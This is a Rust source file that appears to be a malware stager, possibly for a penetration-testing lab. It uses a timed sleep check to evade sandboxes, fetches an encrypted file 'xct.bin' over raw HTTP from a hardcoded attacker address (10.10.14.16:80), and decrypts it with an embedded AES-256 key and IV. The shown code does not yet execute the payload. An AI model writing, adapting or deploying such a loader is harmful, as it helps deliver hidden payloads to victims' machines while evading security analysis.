use aes::{
    Aes256,
    cipher::{BlockModeDecrypt, BlockModeEncrypt, KeyIvInit, block_padding::Pkcs7},
};
use cbc::{Decryptor, Encryptor};
use std::{
    error::Error, io::{Read, Write}, net::TcpStream, thread, time::{Duration, SystemTime},
};

type Aes256CbcEnc = Encryptor<Aes256>;
type Aes256CbcDec = Decryptor<Aes256>;

const IV_HEX: &str = "34421aedd8bc5caec8a9075aa67bf9aa";

const REMOTE_IP: &str = "10.10.14.16";
const REMOTE_PORT: &str = "80";
const FILE_PATH: &str = "xct.bin";

fn main() {
    wait(Duration::from_secs(40));
    let key = decode_hex::<32>("359d003b202332e5630cdef69702dff35cc946f6cc9efd4cbad7c0b401660e4a");
    let encrypted_data = download_file(REMOTE_IP, REMOTE_PORT, FILE_PATH).unwrap();
    let data = decrypt_data(&key, encrypted_data);
}

fn wait(duration: Duration) {
    let start_time = SystemTime::now();
    thread::sleep(duration);
    let end_time = SystemTime::now();

    let elapsed = end_time.duration_since(start_time).unwrap_or(Duration::from_secs(0));
    if elapsed.as_secs_f64() <= duration.as_secs_f64() - 0.5f64 {
        std::process::exit(0);
    }
}

fn download_file(remote_ip: &str, remote_port: &str, path: &str) -> Result<Vec<u8>, Box<dyn Error>> {
    // Connect to the server
    let mut stream = TcpStream::connect(format!("{}:{}", remote_ip, remote_port))?;
    
    // Send HTTP GET request
    let request = format!("GET /{} HTTP/1.1\r\n\r\n", path);
    stream.write_all(request.as_bytes())?;
    
    // Read the response data
    let mut data = Vec::new();
    let mut buffer = [0; 512];
    
    loop {
        let num_bytes = stream.read(&mut buffer)?;
        if num_bytes == 0 {
            break; // Connection closed
        }
        data.extend_from_slice(&buffer[..num_bytes]);
    }
    
    Ok(data)
}

fn decode_hex<const N: usize>(hex: &str) -> [u8; N] {
    let mut bytes = [0u8; N];
    for (i, byte) in bytes.iter_mut().enumerate() {
        *byte = u8::from_str_radix(&hex[i * 2..i * 2 + 2], 16).unwrap();
    }
    bytes
}

fn encrypt_data(key: &[u8; 32], plaintext: &[u8]) -> Vec<u8> {
    let iv = decode_hex::<16>(IV_HEX);
    let mut buf = vec![0u8; plaintext.len() + 16];
    buf[..plaintext.len()].copy_from_slice(plaintext);
    let ct_len = Aes256CbcEnc::new(key.into(), &iv.into())
        .encrypt_padded::<Pkcs7>(&mut buf, plaintext.len())
        .unwrap()
        .len();
    buf.truncate(ct_len);
    buf
}

fn decrypt_data(key: &[u8; 32], data: Vec<u8>) -> Vec<u8> {
    let iv = decode_hex::<16>(IV_HEX);
    let mut buf = data;
    Aes256CbcDec::new(key.into(), &iv.into())
        .decrypt_padded::<Pkcs7>(&mut buf)
        .unwrap()
        .to_vec()
}

